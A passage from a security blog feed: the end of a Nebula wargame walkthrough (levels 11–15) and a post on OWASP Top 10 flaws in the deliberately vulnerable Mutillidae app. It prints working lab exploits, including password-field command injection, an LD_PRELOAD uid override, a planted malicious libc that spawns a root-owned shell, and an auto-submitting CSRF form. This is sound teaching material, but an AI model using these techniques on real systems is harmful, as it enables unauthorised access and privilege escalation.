&lt;p&gt;The &lt;code&gt;fread()&lt;/code&gt; function will always return 1 here, because by definition it returns number of &lt;em&gt;items&lt;/em&gt; read and not bytes read. So it looks like if we want to take the first execution path - our
workable buffer length is 1.&lt;/p&gt;

&lt;p&gt;If we test the program with a valid header and a buffer which only contains the &lt;code&gt;x&lt;/code&gt; char:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level11@nebula:~$ /home/flag11/flag11 
Content-Length: 1
x
sh: yP?: command not found
level11@nebula:~$ 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that we reach the &lt;code&gt;system()&lt;/code&gt; call and that the &lt;code&gt;x&lt;/code&gt; char was decoded to &lt;code&gt;y&lt;/code&gt;. The additional random chars are there due to inability to properly null terminate our buffer, but
executing with the same buffer a few times we can reach a point where the second char will &lt;em&gt;randomly&lt;/em&gt; be a null terminator.
So now we can get code execution:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level11@nebula:~$ cat y
getflag

level11@nebula:~$ export PATH=~:$PATH
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
sh: yp!: command not found
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
sh: $&#39;y0\314&#39;: command not found
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
sh: $&#39;y\260\356&#39;: command not found
level11@nebula:~$ echo -ne &amp;quot;Content-Length: 1\nx&amp;quot; | /home/flag11/flag11 
getflag is executing on a non-flag account, this doesn&#39;t count
level11@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We manage to execute &lt;code&gt;getflag&lt;/code&gt;, but it complains about the user id. There are no user id manipulations in the code prior to calling &lt;em&gt;system()&lt;/em&gt;, so I think there is a bug in this level.&lt;/p&gt;

&lt;h3 id=&#34;level12:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level12&lt;/h3&gt;

&lt;h4 id=&#34;decription:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Decription:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-7:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;local socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password)
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
      local h = hash(line)

      if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
          client:send(&amp;quot;Better luck next time\n&amp;quot;);
      else
          client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
      end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The listener expects a password which is hashed (SHA1) and compared to a hardcoded value. The way the hash is calculated is vulnerable
to command injection:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level12@nebula:/home/flag12$ nc localhost 50001
Password: test
Better luck next time
level12@nebula:/home/flag12$ nc localhost 50001
Password: test; getflag &amp;gt; /tmp/flag.txt; test
Better luck next time
level12@nebula:/home/flag12$ cat /tmp/flag.txt 
You have successfully executed getflag on a target account
level12@nebula:/home/flag12$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level13:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level13&lt;/h3&gt;

&lt;h4 id=&#34;description-12:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-8:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
      printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&amp;quot;your token is %s\n&amp;quot;, token);
  
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For this level we can override the &lt;code&gt;getuid()&lt;/code&gt;function using the &lt;code&gt;LD_PRELOAD&lt;/code&gt; &lt;a href=&#34;(https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)&#34;&gt;trick&lt;/a&gt;. The original binary is setuid - which means that it discards the LD_PRELOAD variable. So this technique does not work for privilege escalation in our case, but instead can be used to divert execution path without modifying the binary itself.
For this to work, we need to copy the executable somewhere else:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level13@nebula:~$ cat uid.c
#include &amp;lt;unistd.h&amp;gt;
uid_t getuid()
{
     return 1000;
}
level13@nebula:~$ gcc -fPIC uid.c -shared -o uid.so
level13@nebula:~$ LD_PRELOAD=~/uid.so /home/flag13/flag13 
Security failure detected. UID 1014 started us, we expect 1000
The system administrators will be notified of this violation
level13@nebula:~$ cp /home/flag13/flag13 /tmp/flag13
level13@nebula:~$ LD_PRELOAD=/home/level13/uid.so /tmp/flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:~$ su flag13 -
Password: 
sh-4.2$ id
uid=986(flag13) gid=986(flag13) groups=986(flag13)
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level14:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level14&lt;/h3&gt;

&lt;h4 id=&#34;description-13:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;No source code was provided for this level. So here we must analyze the binary itself and deduce how it encrypts the provided input.
By passing several test strings we can test how the binary works:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level14@nebula:/home/flag14$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./flag14 -e
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefg1level14@nebula:/home/flag14$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we can see that each character in the string is shifted according to its possition (index). The 0th &lt;code&gt;A&lt;/code&gt; is shifted by 0, 1st - by 1, 2nd - by 2, and so on.
A quick python script should reverse this process and decrypt the token:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level14@nebula:/home/flag14$ cat token 
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
level14@nebula:/home/flag14$ cat /tmp/decrypt.py 
import sys

encrypted = &#39;857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.&#39;
plaintext = &#39;&#39;
for i in xrange(len(encrypted)):
    char = chr(ord(encrypted[i]) - i)
    plaintext += char

print plaintext
level14@nebula:/home/flag14$ python /tmp/decrypt.py 
8457c118-887c-4e40-a5a6-33a25353165

level14@nebula:/home/flag14$ su flag14 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level15:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level15&lt;/h3&gt;

&lt;h4 id=&#34;description-14:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Stracing the flag15 binary shows a bunch of reads of &lt;code&gt;libc.so.6&lt;/code&gt; library inside various folders inside &lt;code&gt;/var/tmp/flag15&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:~$ strace /home/flag15/flag15 
execve(&amp;quot;/home/flag15/flag15&amp;quot;, [&amp;quot;/home/flag15/flag15&amp;quot;], [/* 18 vars */]) = 0
brk(0)                                  = 0x8685000
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a7000
access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15&amp;quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open(&amp;quot;/etc/ld.so.cache&amp;quot;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb779e000
close(3)                                = 0
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/lib/i386-linux-gnu/libc.so.6&amp;quot;, O_RDONLY) = 3
read(3, &amp;quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&amp;quot;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x6ea000
mmap2(0x860000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x860000
mmap2(0x863000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x863000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb779d000
set_thread_area({entry_number:-1 -&amp;gt; 6, base_addr:0xb779d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x860000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x57b000, 4096, PROT_READ)     = 0
munmap(0xb779e000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a6000
write(1, &amp;quot;strace it!\n&amp;quot;, 11strace it!
)            = 11
exit_group(11)                          = ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some more information about the binary:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:~$ readelf -d /home/flag15/flag15 

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804821c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      90 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x8049ff4
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482a8
 0x00000011 (REL)                        0x80482a0
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048280
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x8048276
 0x00000000 (NULL)                       0x0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So puting it all together - it looks like the binary is trying to load the &lt;em&gt;libc.so.6&lt;/em&gt; library from &lt;em&gt;RPATH&lt;/em&gt;, which is &lt;em&gt;/var/tmp/flag15&lt;/em&gt;. Since we can write there - we can place a malicious &lt;em&gt;libc.so.6&lt;/em&gt; file
and wait for the binary to load it.&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;flag15&lt;/em&gt; binary has a few functions that we can work with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ objdump -R /home/flag15/flag15 

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;__libc_start_main&lt;/code&gt; seems like the best candidate since it is executed upon loading the shared library.
A simple library code to try to execute bash:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system(&amp;quot;/bin/bash&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, the library does not work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
level15@nebula:/var/tmp/flag15$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some Googling shows that the &amp;ldquo;version&amp;rdquo; error can be solved by linking with a &lt;code&gt;version-script&lt;/code&gt; (older glibc):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ cat version.txt 
GLIBC_2.0 {
};
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -Wl,--version-script=version.txt -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&#39; not found (required by /var/tmp/flag15/libc.so.6)
level15@nebula:/var/tmp/flag15$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now another error, which can be solved by static linking options &lt;code&gt;-Bstatic&lt;/code&gt; and &lt;code&gt;-static-libgcc&lt;/code&gt;.
After adding those - the exploit works, but it seems that our user id is wrong:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version.txt,-Bstatic -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
bash-4.2$ getflag
getflag is executing on a non-flag account, this doesn&#39;t count
bash-4.2$ id
uid=1016(level15) gid=1016(level15) groups=1016(level15)
bash-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We need to reset the efective user id to the real one with &lt;code&gt;setresuid()&lt;/code&gt; and capture the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ cat lib.c 
#include &amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    setresuid(geteuid(),geteuid(),geteuid());
    system(&amp;quot;/bin/bash&amp;quot;);
}
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version.txt,-Bstatic -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
flag15@nebula:/var/tmp/flag15$ id
uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)
flag15@nebula:/var/tmp/flag15$ getflag 
You have successfully executed getflag on a target account
flag15@nebula:/var/tmp/flag15$ 
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>OWASP Top 10 in Mutillidae (Part2)</title>
      <link>http://mislusnys.github.io/blog/2015/02/06/owasp-top-10-in-mutillidae-part2/</link>
      <pubDate>Fri, 06 Feb 2015 04:29:36 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2015/02/06/owasp-top-10-in-mutillidae-part2/</guid>
      <description>

&lt;p&gt;This post is continuation from &lt;a href=&#34;http://mislusnys.github.io/blog/2015/02/03/owasp-top-10-in-mutillidae-part1&#34;&gt;previous post&lt;/a&gt;. We explore less common, however, still potentially very dangerous &lt;em&gt;OWASP Top 10&lt;/em&gt; threats.
Here we go through 6th to 10th places in the list.&lt;/p&gt;

&lt;h2 id=&#34;a6-sensitive-data-exposure:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A6 Sensitive Data Exposure&lt;/h2&gt;

&lt;p&gt;Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.&lt;/p&gt;

&lt;p&gt;Sensitive data can be extracted from HTML storage, HTTP headers or in this example even from HTML comments in the page source code (&lt;em&gt;index.php&lt;/em&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;!-- I think the database password is set to blank or perhaps samurai.
It depends on whether you installed this web app from irongeeks site or
are using it inside Kevin Johnsons Samurai web testing framework.
It is ok to put the password in HTML comments because no user will ever see
this comment. I remember that security instructor saying we should use the
framework comment symbols (ASP.NET, JAVA, PHP, Etc.)
rather than HTML comments, but we all know those
security instructors are just making all this up. --&amp;gt;			&amp;lt;!-- End Content --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;a7-missing-function-level-access-control:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A7 Missing Function Level Access Control&lt;/h2&gt;

&lt;p&gt;Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.&lt;/p&gt;

&lt;p&gt;First example in mutillidae is the &lt;code&gt;robots.txt&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent: *
Disallow: passwords/
Disallow: config.inc
Disallow: classes/
Disallow: javascript/
Disallow: owasp-esapi-php/
Disallow: documentation/
Disallow: phpmyadmin/
Disallow: includes/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While it prevents web crawlers from indexing these files and folders, it also gives the attacker information about the structure of the website. And in this case even provides with sensitive information directly (The &lt;em&gt;passwords&lt;/em&gt; folder
contains information about few legitimate accounts).&lt;/p&gt;

&lt;p&gt;Another &amp;ldquo;security by obscurity&amp;rdquo; example is &amp;ldquo;secret&amp;rdquo; administrative or configuration pages. Using Burp-Intruder in sniper mode or dirbuster we could find secret pages. Sometimes they are very obvious such as
&lt;em&gt;secret.php, admin.php, administrator.php&lt;/em&gt;. In our case &lt;em&gt;phpmyadmin.php&lt;/em&gt; page is accessible to anyone, even anonymous user.&lt;/p&gt;

&lt;h2 id=&#34;a8-cross-site-request-forgery-csrf:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A8 Cross-Site Request Forgery (CSRF)&lt;/h2&gt;

&lt;p&gt;A CSRF attack forces a logged-on victim&amp;rsquo;s browser to send a forged HTTP request, including the victim&amp;rsquo;s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim&amp;rsquo;s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;add-to-your-blog.php&lt;/code&gt; page is vulnerable to CSRF. We can intercept the POST request with burp:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/06/burp.png&#34; alt=&#34;burp&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Using this information we can construct a malicious form which submits the data upon loading the page (onload function):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
    &amp;lt;body onload=&amp;quot;document.createElement(&#39;form&#39;).submit.call(document.getElementById(&#39;evil&#39;))&amp;quot;&amp;gt;
        &amp;lt;form id=&amp;quot;evil&amp;quot; action=&amp;quot;http://192.168.1.66/mutillidae/index.php?page=add-to-your-blog.php&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;application/x-www-form-urlencoded&amp;quot;&amp;gt; 
            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;csrf-token&amp;quot; value=&amp;quot;&amp;quot;/&amp;gt; 
            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;blog_entry&amp;quot; value=&amp;quot;I made you post this!&amp;quot;/&amp;gt; 
            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;add-to-your-blog-php-submit-button&amp;quot; value=&amp;quot;Save+Blog+Entry&amp;quot;/&amp;gt; 
        &amp;lt;/form&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If logged in user (with a valid session token) visits this malicious page, then a new blog post is made on the users behalf:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/06/blog.png&#34; alt=&#34;blog&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;a9-using-components-with-known-vulnerabilities:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A9 Using Components with Known Vulnerabilities&lt;/h2&gt;

&lt;p&gt;Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.&lt;/p&gt;

&lt;p&gt;In our case obtaining information about the server components is pretty easy (&lt;em&gt;phpinfo.php&lt;/em&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/06/info.png&#34; alt=&#34;info&#34; /&gt;&lt;/p&gt;

&lt;p&gt;However, in this case the server components have no known vulnerabilities (at the time of writing).&lt;/p&gt;

&lt;h2 id=&#34;a10-unvalidated-redirects-and-forwards:dae1cab322183177c511022ba8a7d0b0&#34;&gt;A10 Unvalidated Redirects and Forwards&lt;/h2&gt;

&lt;p&gt;Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.&lt;/p&gt;

&lt;p&gt;In our case the credits page is vulnerable to unvalidated redirect.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.1.66/mutillidae/index.php?page=redirectandlog.php&amp;amp;forwardurl=http://www.owasp.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here, the &lt;code&gt;forwardurl&lt;/code&gt; specifies the redirection url and the attacker can point to a malicious page. Unvalidated redirects can increase the success rate in phishing attacks, because the first part of the link looks &amp;ldquo;legit&amp;rdquo;.&lt;/p&gt;

&lt;h2 id=&#34;summary:dae1cab322183177c511022ba8a7d0b0&#34;&gt;Summary&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;OWASP Top 10&lt;/em&gt; describes most common web vulnerabilities found in the real world. &lt;em&gt;Mutillidae II&lt;/em&gt; is deliberately vulnerable web application and contains at least one vulnerability from each OWASP category. It provides good
insight into majority of web related exploitation methods.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OWASP Top 10 in Mutillidae (Part1)</title>
      <link>http://mislusnys.github.io/blog/2015/02/03/owasp-top-10-in-mutillidae-part1/</link>
      <pubDate>Tue, 03 Feb 2015 10:48:16 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2015/02/03/owasp-top-10-in-mutillidae-part1/</guid>
      <description>

&lt;h2 id=&#34;intro:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;Intro&lt;/h2&gt;

